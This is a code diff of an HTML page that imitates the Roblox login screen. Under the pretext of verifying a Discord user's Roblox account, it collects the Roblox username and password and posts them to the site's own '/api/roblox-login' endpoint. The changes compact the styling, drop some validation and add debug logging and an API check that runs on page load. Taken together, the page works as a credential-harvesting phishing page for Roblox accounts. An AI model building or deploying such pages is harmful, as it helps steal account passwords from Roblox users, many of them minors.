@@ -5,189 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Login</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
-        
-        body {
-            background: #f2f2f2;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .login-container {
-            width: 100%;
-            max-width: 420px;
-        }
-        
-        .login-card {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-            padding: 40px;
-        }
-        
-        .login-header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .roblox-logo {
-            font-size: 32px;
-            font-weight: 900;
-            color: #00a2ff;
-            margin-bottom: 10px;
-        }
-        
-        .login-title {
-            font-size: 24px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 5px;
-        }
-        
-        .login-subtitle {
-            color: #666;
-            font-size: 16px;
-        }
-        
-        .login-form {
-            margin-top: 20px;
-        }
-        
-        .input-group {
-            margin-bottom: 20px;
-        }
-        
-        .input-label {
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-weight: 500;
-            font-size: 14px;
-        }
-        
-        .input-field {
-            width: 100%;
-            padding: 12px 16px;
-            border: 2px solid #e0e0e0;
-            border-radius: 4px;
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-        
-        .input-field:focus {
-            outline: none;
-            border-color: #00a2ff;
-        }
-        
-        .password-container {
-            position: relative;
-        }
-        
-        .toggle-password {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: #666;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        
-        .login-button {
-            width: 100%;
-            background: #00a2ff;
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s;
-            margin-top: 10px;
-        }
-        
-        .login-button:hover {
-            background: #0088d1;
-        }
-        
-        .login-button:disabled {
-            background: #cccccc;
-            cursor: not-allowed;
-        }
-        
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.8);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 2000;
-        }
-        
-        .loading-content {
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            text-align: center;
-            max-width: 400px;
-        }
-        
-        .loading-spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #00a2ff;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .error-message {
-            background: #ffe6e6;
-            color: #d32f2f;
-            padding: 12px;
-            border-radius: 4px;
-            margin-bottom: 20px;
-            display: none;
-            text-align: center;
-        }
-        
-        .success-message {
-            background: #e6ffe6;
-            color: #2e7d32;
-            padding: 12px;
-            border-radius: 4px;
-            margin-bottom: 20px;
-            display: none;
-            text-align: center;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: #f2f2f2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .login-container { width: 100%; max-width: 420px; }
+        .login-card { background: white; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); padding: 40px; }
+        .login-header { text-align: center; margin-bottom: 30px; }
+        .roblox-logo { font-size: 32px; font-weight: 900; color: #00a2ff; margin-bottom: 10px; }
+        .login-title { font-size: 24px; font-weight: 600; color: #333; margin-bottom: 5px; }
+        .input-group { margin-bottom: 20px; }
+        .input-label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; font-size: 14px; }
+        .input-field { width: 100%; padding: 12px 16px; border: 2px solid #e0e0e0; border-radius: 4px; font-size: 16px; }
+        .input-field:focus { outline: none; border-color: #00a2ff; }
+        .password-container { position: relative; }
+        .toggle-password { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #666; cursor: pointer; }
+        .login-button { width: 100%; background: #00a2ff; color: white; border: none; padding: 14px; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .login-button:hover { background: #0088d1; }
+        .loading-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 2000; }
+        .loading-content { background: white; padding: 30px; border-radius: 8px; text-align: center; max-width: 400px; }
+        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #00a2ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .error-message { background: #ffe6e6; color: #d32f2f; padding: 12px; border-radius: 4px; margin-bottom: 20px; display: none; text-align: center; }
+        .debug-info { margin-top: 20px; padding: 10px; background: #f5f5f5; border-radius: 4px; font-size: 12px; color: #666; }
     </style>
 </head>
 <body>
     <div class="login-container">
         <div class="login-card">
             <div class="error-message" id="errorMessage"></div>
-            <div class="success-message" id="successMessage"></div>
             
             <div class="login-header">
                 <div class="roblox-logo">ROBLOX</div>
@@ -198,34 +42,23 @@
             <form class="login-form" id="loginForm">
                 <div class="input-group">
                     <label class="input-label">Username or Email</label>
-                    <input 
-                        type="text" 
-                        class="input-field" 
-                        id="username" 
-                        placeholder="Enter username or email"
-                        required
-                    >
+                    <input type="text" class="input-field" id="username" placeholder="Enter username or email" required>
                 </div>
                 
                 <div class="input-group">
                     <label class="input-label">Password</label>
                     <div class="password-container">
-                        <input 
-                            type="password" 
-                            class="input-field" 
-                            id="password" 
-                            placeholder="Enter password"
-                            required
-                        >
-                        <button type="button" class="toggle-password" onclick="togglePassword()">
-                            Show
-                        </button>
+                        <input type="password" class="input-field" id="password" placeholder="Enter password" required>
+                        <button type="button" class="toggle-password" onclick="togglePassword()">Show</button>
                     </div>
                 </div>
                 
-                <button type="submit" class="login-button" id="loginButton">
-                    Log In
-                </button>
+                <button type="submit" class="login-button" id="loginButton">Log In</button>
+                
+                <div class="debug-info" id="debugInfo">
+                    <strong>Debug Info:</strong><br>
+                    API Status: <span id="apiStatus">Not tested</span>
+                </div>
             </form>
         </div>
     </div>
@@ -239,44 +72,34 @@
     </div>
     
     <script>
-        // Get parameters from URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const discordId = urlParams.get('discord_id') || sessionStorage.getItem('discord_id');
-        const token = sessionStorage.getItem('verification_token');
+        // Test API connection on page load
+        window.addEventListener('load', async () => {
+            try {
+                const testResponse = await fetch('/api/test');
+                const testData = await testResponse.json();
+                document.getElementById('apiStatus').textContent = '✅ Working';
+                document.getElementById('apiStatus').style.color = 'green';
+            } catch (error) {
+                document.getElementById('apiStatus').textContent = '❌ Failed: ' + error.message;
+                document.getElementById('apiStatus').style.color = 'red';
+                console.error('API test failed:', error);
+            }
+        });
         
-        // Store Discord ID for API calls
-        if (discordId) {
-            sessionStorage.setItem('discord_id', discordId);
-        }
+        const urlParams = new URLSearchParams(window.location.search);
+        const discordId = urlParams.get('discord_id');
         
         function togglePassword() {
             const passwordField = document.getElementById('password');
             const toggleButton = document.querySelector('.toggle-password');
-            
-            if (passwordField.type === 'password') {
-                passwordField.type = 'text';
-                toggleButton.textContent = 'Hide';
-            } else {
-                passwordField.type = 'password';
-                toggleButton.textContent = 'Show';
-            }
+            passwordField.type = passwordField.type === 'password' ? 'text' : 'password';
+            toggleButton.textContent = passwordField.type === 'password' ? 'Show' : 'Hide';
         }
         
         function showError(message) {
             const errorDiv = document.getElementById('errorMessage');
             errorDiv.textContent = message;
             errorDiv.style.display = 'block';
-            
-            // Hide after 5 seconds
-            setTimeout(() => {
-                errorDiv.style.display = 'none';
-            }, 5000);
-        }
-        
-        function showSuccess(message) {
-            const successDiv = document.getElementById('successMessage');
-            successDiv.textContent = message;
-            successDiv.style.display = 'block';
         }
         
         function showLoading(show, title = 'Verifying Account...', text = 'Please wait while we verify your Roblox account.') {
@@ -302,24 +125,16 @@
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value;
             
-            // Basic validation
             if (!username || !password) {
                 showError('Please enter both username and password');
                 return;
             }
             
-            if (password.length < 3) {
-                showError('Password must be at least 3 characters');
-                return;
-            }
-            
-            // Show loading
             showLoading(true);
             
             try {
-                console.log('Sending login request...');
+                console.log('Sending login request to API...');
                 
-                // Send credentials to our API
                 const response = await fetch('/api/roblox-login', {
                     method: 'POST',
                     headers: {
@@ -328,59 +143,65 @@
                     body: JSON.stringify({
                         username: username,
                         password: password,
-                        discordId: discordId,
-                        token: token
+                        discordId: discordId
                     })
                 });
                 
-                const data = await response.json();
+                console.log('Response status:', response.status);
+                console.log('Response headers:', response.headers);
+                
+                const responseText = await response.text();
+                console.log('Response text:', responseText);
+                
+                let data;
+                try {
+                    data = JSON.parse(responseText);
+                } catch (e) {
+                    console.error('Failed to parse JSON:', e);
+                    throw new Error('Invalid server response');
+                }
+                
+                if (!response.ok) {
+                    throw new Error(data.error || `Server returned ${response.status}`);
+                }
                 
                 if (data.success) {
                     console.log('Login successful:', data);
                     
-                    // Store verification data
+                    // Store data
                     localStorage.setItem('roblox_username', data.robloxUsername);
                     localStorage.setItem('roblox_userid', data.robloxId);
-                    localStorage.setItem('display_name', data.displayName);
                     localStorage.setItem('verification_token', data.verificationToken);
                     
-                    // Show success message
-                    showLoading(false);
-                    showSuccess('✓ Account verified successfully!');
-                    
-                    // Redirect to success page after a delay
+                    // Redirect to success page
                     setTimeout(() => {
                         window.location.href = `verification-success.html?username=${encodeURIComponent(data.robloxUsername)}&userid=${data.robloxId}`;
-                    }, 1500);
+                    }, 1000);
                     
                 } else {
-                    // Login failed
-                    console.error('Login failed:', data.error);
-                    showLoading(false);
-                    showError(data.error || data.message || 'Invalid username or password. Please try again.');
+                    throw new Error(data.error || 'Verification failed');
                 }
                 
             } catch (error) {
                 console.error('Login error:', error);
                 showLoading(false);
-                showError('Network error. Please check your connection and try again.');
+                
+                let errorMessage = 'An error occurred. Please try again.';
+                
+                if (error.message.includes('Failed to fetch')) {
+                    errorMessage = 'Network error. Please check your connection.';
+                } else if (error.message.includes('Invalid server response')) {
+                    errorMessage = 'Server returned an invalid response.';
+                } else if (error.message.includes('Server returned')) {
+                    errorMessage = `Server error: ${error.message}`;
+                }
+                
+                showError(errorMessage);
             }
         }
         
-        // Attach form submit handler
         document.getElementById('loginForm').addEventListener('submit', handleLogin);
-        
-        // Auto-focus username field
         document.getElementById('username').focus();
-        
-        // Add input validation
-        document.getElementById('password').addEventListener('input', function(e) {
-            if (e.target.value.length < 3) {
-                e.target.style.borderColor = '#ff4444';
-            } else {
-                e.target.style.borderColor = '#00a2ff';
-            }
-        });
     </script>
 </body>
 </html>
